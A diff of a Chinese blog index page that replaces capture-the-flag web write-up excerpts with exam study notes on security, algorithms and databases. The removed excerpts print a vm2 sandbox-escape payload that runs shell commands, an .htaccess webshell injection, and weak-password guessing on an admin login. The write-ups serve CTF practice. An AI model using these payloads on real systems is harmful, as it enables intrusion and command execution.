@@ -167,8 +167,8 @@
         
 
 <div class="post">
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/HFCTF2020-JustEscape/">
-        <h2 class="post-title">[HFCTF2020]JustEscape</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%92%8C%E5%A4%9A%E5%AA%92%E4%BD%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -176,7 +176,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/21
+            2024/10/23
         </span>
         
         
@@ -184,30 +184,27 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212114789.png" alt="image-20240621211441703"></p>
-<p>真的是php？</p>
-<p>不懂</p>
-<p>看到wp中大佬说是vm沙盒，先照着做吧</p>
-<p>当code为空时</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( array_key_exists( &quot;code&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;code&#x27; ] != NULL ) &#123;</span><br><span class="line">    $code = $_GET[&#x27;code&#x27;];</span><br><span class="line">    echo eval(code);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>所以是一个获取键什么的</p>
-<p>这里尝试一下</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212118781.png" alt="image-20240621211843751"></p>
-<p>发现一长串报错</p>
-<p><strong>error.stack</strong>可以简单解释为用alert()弹出console.log()的一样的异常堆栈信息</p>
-<p>在github上可以找到破坏沙盒的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line">const &#123;VM&#125; = require(&#x27;vm2&#x27;);</span><br><span class="line">const untrusted = &#x27;(&#x27; + function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;+&#x27;)()&#x27;;</span><br><span class="line">try&#123;</span><br><span class="line">	console.log(new VM().run(untrusted));</span><br><span class="line">&#125;catch(x)&#123;</span><br><span class="line">	console.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>其中选用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">	TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">	try&#123;</span><br><span class="line">		Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">	&#125;catch(e)&#123;</span><br><span class="line">		return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString();</span><br><span class="line">	&#125;)()</span><br></pre></td></tr></table></figure>
-
-<p>但是我们可以发现其中有些字符被过滤，所以，我们通过重写替换</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat /flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>
-
-<p>prototyp  &#x3D;&gt; [<code>$&#123;</code>${<code>prototyp</code>}e<code>&#125;</code>]<br>get_process &#x3D;&gt; [<code>$&#123;</code>${<code>get_proces</code>}s<code>&#125;</code>]<br>require &#x3D;&gt; [<code>$&#123;</code>${<code>requir</code>}e<code>&#125;</code>]<br>child_process &#x3D;&gt; <code>$&#123;</code>${<code>child_proces</code>}s<code>&#125;</code><br>execSync &#x3D;&gt; [<code>$&#123;</code>${<code>exe</code>}cSync<code>&#125;</code>]</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212127520.png" alt="image-20240621212758486"></p>
-<p>得到flag</p>
+            <h3 id="信息安全和多媒体基础知识"><a href="#信息安全和多媒体基础知识" class="headerlink" title="信息安全和多媒体基础知识"></a>信息安全和多媒体基础知识</h3><h4 id="网络安全基本概念"><a href="#网络安全基本概念" class="headerlink" title="网络安全基本概念"></a>网络安全基本概念</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410231957865.png" alt="image-20241023195658697"></p>
+<h5 id="信息系统安全属性"><a href="#信息系统安全属性" class="headerlink" title="信息系统安全属性"></a>信息系统安全属性</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410231957319.png" alt="image-20241023195744202"></p>
+<h4 id="网络安全威胁"><a href="#网络安全威胁" class="headerlink" title="网络安全威胁"></a>网络安全威胁</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410231958450.png" alt="image-20241023195833311"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410231959347.png" alt="image-20241023195944278"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232002921.png" alt="image-20241023200232846"></p>
+<h4 id="网络攻击"><a href="#网络攻击" class="headerlink" title="网络攻击"></a>网络攻击</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232003766.png" alt="image-20241023200320643"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232003413.png" alt="image-20241023200347308"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232004492.png" alt="image-20241023200418359"></p>
+<h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232004912.png" alt="image-20241023200454796"></p>
+<h5 id="体系结构"><a href="#体系结构" class="headerlink" title="体系结构"></a>体系结构</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232005930.png" alt="image-20241023200544812"></p>
+<h4 id="加密与数字签名"><a href="#加密与数字签名" class="headerlink" title="加密与数字签名"></a>加密与数字签名</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232006684.png" alt="image-20241023200619592"></p>
+<h5 id="对称密钥密码体制"><a href="#对称密钥密码体制" class="headerlink" title="对称密钥密码体制"></a>对称密钥密码体制</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232008856.png" alt="image-20241023200857722"></p>
+<h5 id="非对称密钥密码体制"><a href="#非对称密钥密码体制" class="headerlink" title="非对称密钥密码体制"></a>非对称密钥密码体制</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232010133.png" alt="image-20241023201019026"></p>
+<h5 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232010112.png" alt="image-20241023201045998"></p>
+<h4 id="各网络层次安全保障"><a href="#各网络层次安全保障" class="headerlink" title="各网络层次安全保障"></a>各网络层次安全保障</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232011671.png" alt="image-20241023201139625"></p>
+<h4 id="音频相关概念"><a href="#音频相关概念" class="headerlink" title="音频相关概念"></a>音频相关概念</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232012467.png" alt="image-20241023201215413"></p>
+<h4 id="图像相关概念"><a href="#图像相关概念" class="headerlink" title="图像相关概念"></a>图像相关概念</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232012769.png" alt="image-20241023201239709"></p>
+<h4 id="多媒体的种类"><a href="#多媒体的种类" class="headerlink" title="多媒体的种类"></a>多媒体的种类</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232013766.png" alt="image-20241023201302650"></p>
+<h4 id="多媒体计算问题"><a href="#多媒体计算问题" class="headerlink" title="多媒体计算问题"></a>多媒体计算问题</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232013100.png" alt="image-20241023201333052"></p>
+<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202410232015775.png" alt="image-20241023201519639"></p>
+<p>答案：d，c，d</p>
 
             
         </div>
@@ -217,12 +214,12 @@
         
         
     </div>
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/HFCTF2020-JustEscape/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%92%8C%E5%A4%9A%E5%AA%92%E4%BD%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/">
-        <h2 class="post-title">[羊城杯2020]easyphp</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -230,7 +227,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/21
+            2024/10/23
         </span>
         
         
@@ -238,21 +235,16 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $files = scandir(&#x27;./&#x27;); </span><br><span class="line">    foreach($files as $file) &#123;</span><br><span class="line">        if(is_file($file))&#123;</span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!isset($_GET[&#x27;content&#x27;]) || !isset($_GET[&#x27;filename&#x27;])) &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[&#x27;content&#x27;];</span><br><span class="line">    if(stristr($content,&#x27;on&#x27;) || stristr($content,&#x27;html&#x27;) || stristr($content,&#x27;type&#x27;) || stristr($content,&#x27;flag&#x27;) || stristr($content,&#x27;upload&#x27;) || stristr($content,&#x27;file&#x27;)) &#123;</span><br><span class="line">        echo &quot;Hacker&quot;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[&#x27;filename&#x27;];</span><br><span class="line">    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) &#123;</span><br><span class="line">        echo &quot;Hacker&quot;;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(&#x27;./&#x27;); </span><br><span class="line">    foreach($files as $file) &#123;</span><br><span class="line">        if(is_file($file))&#123;</span><br><span class="line">            if ($file !== &quot;index.php&quot;) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . &quot;\nHello, world&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>简单直接的代码题，我不是说简单</p>
-<p>看看代码</p>
-<p>首先scandir获取目录，不为index.php则删除</p>
-<p>之后就是文件写入的过滤，最后读取文件</p>
-<p>因为文件名没有字母，所以我们可以尝试.htaccess</p>
-<p>向.htaccess文件写入shell，并且用auto_prepend_file包含.htaccess，但是file关键字被ban了，可以用换行绕过，结尾要用\处理content中的\n</p>
-<p>所以payload（通过注释的方式写shell）:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fil\e .htaccess </span><br><span class="line">#&lt;?php system(&#x27;ls /&#x27;);?&gt;\ </span><br></pre></td></tr></table></figure>
-
-<p>为了不换行，我们对这个进行url编码，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?filename=.htaccess&amp;content=php_value%20auto_prepend_fil%5Ce%20.htaccess%20%0A#%3C?php%20system(&#x27;ls%20/&#x27;);?%3E%5C%20</span><br></pre></td></tr></table></figure>
-
-<p>之后就是</p>
+            <h3 id="算法设计与分析"><a href="#算法设计与分析" class="headerlink" title="算法设计与分析"></a>算法设计与分析</h3><h4 id="分治法"><a href="#分治法" class="headerlink" title="分治法"></a>分治法</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132337142.png" alt="image-20240913233727945"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132339631.png" alt="image-20240913233959562"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132353135.png" alt="image-20240913235350038"></p>
+<h5 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132346144.png" alt="image-20240913234632040"></p>
+<h4 id="动态规划法"><a href="#动态规划法" class="headerlink" title="动态规划法"></a>动态规划法</h4><h5 id="子问题不独立–区别分治法"><a href="#子问题不独立–区别分治法" class="headerlink" title="子问题不独立–区别分治法"></a>子问题不独立–区别分治法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132347678.png" alt="image-20240913234748577"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132355287.png" alt="image-20240913235528165"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409140008354.png" alt="image-20240914000804243"></p>
+<h5 id="整体最优–区别贪心法"><a href="#整体最优–区别贪心法" class="headerlink" title="整体最优–区别贪心法"></a>整体最优–区别贪心法</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132349699.png"></p>
+<h4 id="贪心法"><a href="#贪心法" class="headerlink" title="贪心法"></a>贪心法</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132352103.png" alt="image-20240913235201981"></p>
+<h4 id="回溯法–深度优先搜索法"><a href="#回溯法–深度优先搜索法" class="headerlink" title="回溯法–深度优先搜索法"></a>回溯法–深度优先搜索法</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409132353247.png" alt="image-20240913235304129"></p>
 
             
         </div>
@@ -262,12 +254,12 @@
         
         
     </div>
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-easyphp/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E7%AE%97%E6%B3%95%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GXYCTF2019-StrongestMind/">
-        <h2 class="post-title">[GXYCTF2019]StrongestMind</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -275,7 +267,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/21
+            2024/10/23
         </span>
         
         
@@ -283,10 +275,58 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406212012626.png" alt="image-20240621201241587"></p>
-<p>我一开始想过会很难，但是没想到真是写一千次，直接脚本运行！</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from requests import *</span><br><span class="line">import time</span><br><span class="line">import re</span><br><span class="line">url = &quot;http://dbbc5a26-5ac4-43d7-8540-ecfdbd1f1879.node5.buuoj.cn:81/&quot;</span><br><span class="line">s=session()</span><br><span class="line">kk = re.compile(r&#x27;\d+ [-|+] \d+&#x27;)</span><br><span class="line">r=s.get(url)</span><br><span class="line"></span><br><span class="line">for i in range(1001):</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    zz=kk.findall(r.text)[0]</span><br><span class="line">    #print(zz)</span><br><span class="line">    zzz=eval(zz)</span><br><span class="line">    #print(zzz)</span><br><span class="line">    data=&#123;&quot;answer&quot;:zzz&#125;</span><br><span class="line">    time.sleep(0.1)</span><br><span class="line">    </span><br><span class="line">    r=s.post(url,data=data)</span><br><span class="line">    </span><br><span class="line">    r.encoding=&#x27;utf-8&#x27;</span><br><span class="line">    </span><br><span class="line">    print((r.text))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+            <h3 id="数据库系统基础知识"><a href="#数据库系统基础知识" class="headerlink" title="数据库系统基础知识"></a>数据库系统基础知识</h3><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409241959413.png" alt="image-20240924195948292"></p>
+<h5 id="DBMS的特征和分类"><a href="#DBMS的特征和分类" class="headerlink" title="DBMS的特征和分类"></a>DBMS的特征和分类</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242001261.png" alt="image-20240924200147135"></p>
+<h4 id="数据库三级模式两级映像"><a href="#数据库三级模式两级映像" class="headerlink" title="数据库三级模式两级映像"></a>数据库三级模式两级映像</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242003439.png" alt="image-20240924200349382"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242006163.png" alt="image-20240924200615012"></p>
+<h4 id="数据库的分析与设计过程"><a href="#数据库的分析与设计过程" class="headerlink" title="数据库的分析与设计过程"></a>数据库的分析与设计过程</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242010264.png" alt="image-20240924201056223"></p>
+<h4 id="数据模型"><a href="#数据模型" class="headerlink" title="数据模型"></a>数据模型</h4><h5 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242012913.png" alt="image-20240924201251800"></p>
+<h5 id="E-R模型"><a href="#E-R模型" class="headerlink" title="E-R模型"></a>E-R模型</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242013642.png" alt="image-20240924201330550"></p>
+<h5 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242015473.png" alt="image-20240924201535361"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242016106.png" alt="image-20240924201602013"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242017426.png" alt="image-20240924201732379"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409242017671.png" alt="image-20240924201759569"></p>
+<h4 id="关系代数"><a href="#关系代数" class="headerlink" title="关系代数"></a>关系代数</h4><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409252346169.png" alt="image-20240925234636008"></p>
+<h5 id="关系的三种类型"><a href="#关系的三种类型" class="headerlink" title="关系的三种类型"></a>关系的三种类型</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925234953090.png" alt="image-20240925234953090"></p>
+<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409260009298.png" alt="image-20240925235159600"></p>
+<h5 id="七种基本运算"><a href="#七种基本运算" class="headerlink" title="七种基本运算"></a>七种基本运算</h5><p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202409260010738.png" alt="image-20240925235305146"></p>
+<p>下图根据顺序排列</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925235259061.png" alt="image-20240925235259061"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925235352501.png" alt="image-20240925235352501"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925235440943.png" alt="image-20240925235440943"></p>
+<p>连接</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925235500719.png" alt="image-20240925235500719"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925235535193.png" alt="image-20240925235535193"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925235722940.png" alt="image-20240925235722940"></p>
+<h5 id="查询优化原则"><a href="#查询优化原则" class="headerlink" title="查询优化原则"></a>查询优化原则</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926000317375.png" alt="image-20240926000317375"></p>
+<h4 id="数据库的完整性约束"><a href="#数据库的完整性约束" class="headerlink" title="数据库的完整性约束"></a>数据库的完整性约束</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240925234838260.png" alt="image-20240925234838260"></p>
+<h4 id="sql简介"><a href="#sql简介" class="headerlink" title="sql简介"></a>sql简介</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926000446625.png" alt="image-20240926000446625"></p>
+<h4 id="关系数据库的规范化"><a href="#关系数据库的规范化" class="headerlink" title="关系数据库的规范化"></a>关系数据库的规范化</h4><h5 id="函数依赖"><a href="#函数依赖" class="headerlink" title="函数依赖"></a>函数依赖</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202040184.png" alt="image-20240926202040184"></p>
+<p>左为部分函数依赖，右为传递函数依赖</p>
+<h5 id="求候选码"><a href="#求候选码" class="headerlink" title="求候选码"></a>求候选码</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202225098.png" alt="image-20240926202225098"></p>
+<h6 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h6><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202257424.png" alt="image-20240926202257424"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202432086.png" alt="image-20240926202432086"></p>
+<h5 id="规范化理论（非规范化存在的问题）"><a href="#规范化理论（非规范化存在的问题）" class="headerlink" title="规范化理论（非规范化存在的问题）"></a>规范化理论（非规范化存在的问题）</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202450404.png" alt="image-20240926202450404"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202532610.png" alt="image-20240926202532610"></p>
+<h5 id="规范化理论（范式）"><a href="#规范化理论（范式）" class="headerlink" title="规范化理论（范式）"></a>规范化理论（范式）</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202623943.png" alt="image-20240926202623943"></p>
+<h6 id="第一范式（1NF）"><a href="#第一范式（1NF）" class="headerlink" title="第一范式（1NF）"></a>第一范式（1NF）</h6><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202749988.png" alt="image-20240926202749988"></p>
+<p>上图为反例</p>
+<h6 id="第二范式（2NF）"><a href="#第二范式（2NF）" class="headerlink" title="第二范式（2NF）"></a>第二范式（2NF）</h6><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926202910544.png" alt="image-20240926202910544"></p>
+<h6 id="第三范式（3NF）"><a href="#第三范式（3NF）" class="headerlink" title="第三范式（3NF）"></a>第三范式（3NF）</h6><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926203050458.png" alt="image-20240926203050458"></p>
+<h6 id="BCNF（巴斯克斯范式）"><a href="#BCNF（巴斯克斯范式）" class="headerlink" title="BCNF（巴斯克斯范式）"></a>BCNF（巴斯克斯范式）</h6><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926203244239.png" alt="image-20240926203244239"></p>
+<p>例题：</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926203443032.png" alt="image-20240926203443032"></p>
+<h5 id="关系模式分解"><a href="#关系模式分解" class="headerlink" title="关系模式分解"></a>关系模式分解</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926203733262.png" alt="image-20240926203733262"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926203907466.png" alt="image-20240926203907466"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926203924881.png" alt="image-20240926203924881"></p>
+<h4 id="数据库控制功能"><a href="#数据库控制功能" class="headerlink" title="数据库控制功能"></a>数据库控制功能</h4><h5 id="事务管理"><a href="#事务管理" class="headerlink" title="事务管理"></a>事务管理</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926204146849.png" alt="image-20240926204146849"></p>
+<h5 id="并发控制"><a href="#并发控制" class="headerlink" title="并发控制"></a>并发控制</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926204406623.png" alt="image-20240926204406623"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926204650209.png" alt="image-20240926204650209"></p>
+<h5 id="备份与恢复"><a href="#备份与恢复" class="headerlink" title="备份与恢复"></a>备份与恢复</h5><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926212449022.png" alt="image-20240926212449022"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926212604748.png" alt="image-20240926212604748"></p>
+<h4 id="数据仓库和数据挖掘"><a href="#数据仓库和数据挖掘" class="headerlink" title="数据仓库和数据挖掘"></a>数据仓库和数据挖掘</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926212636791.png" alt="image-20240926212636791"></p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926212759892.png" alt="image-20240926212759892"></p>
+<h4 id="大数据基本概念"><a href="#大数据基本概念" class="headerlink" title="大数据基本概念"></a>大数据基本概念</h4><p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240926212832624.png" alt="image-20240926212832624"></p>
 
             
         </div>
@@ -296,12 +336,12 @@
         
         
     </div>
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GXYCTF2019-StrongestMind/" class="go-post">阅读全文</a>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="go-post">阅读全文</a>
 </div>
 
 <div class="post">
-    <a href="/2024/06/21/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GKCTF-2021-easycms/">
-        <h2 class="post-title">[GKCTF 2021]easycms</h2>
+    <a href="/2024/10/23/%E8%BD%AF%E8%80%83/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%92%8C%E7%AE%97%E6%B3%95/">
+        <h2 class="post-title"></h2>
     </a>
     <div class="category-and-date">
         
@@ -309,7 +349,7 @@
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/6/21
+            2024/10/23
         </span>
         
         
@@ -317,49 +357,76 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211945743.png" alt="image-20240621194533640"></p>
-<p>给我整懵了，我差点以为我点到了其它网站了。</p>
-<p>看了眼提示，弱密码五位</p>
-<p>在界面四处找了找，发现没有登陆界面，所以扫文件</p>
-<p>发现admin.php</p>
-<p>所以访问</p>
-<p><img src="https://raw.githubusercontent.com/201001why/image/master/PicGo/202406211948154.png" alt="image-20240621194846104"></p>
-<p>弱密码，可以慢慢试，也可以bp</p>
-<p>但是文件名叫admin诶</p>
-<p>尝试，最后发现是</p>
-<p>admin&#x2F;12345</p>
-<p>登录成功</p>
-<p>之后在界面里逛逛，发现了一个可以上传文件的地方</p>
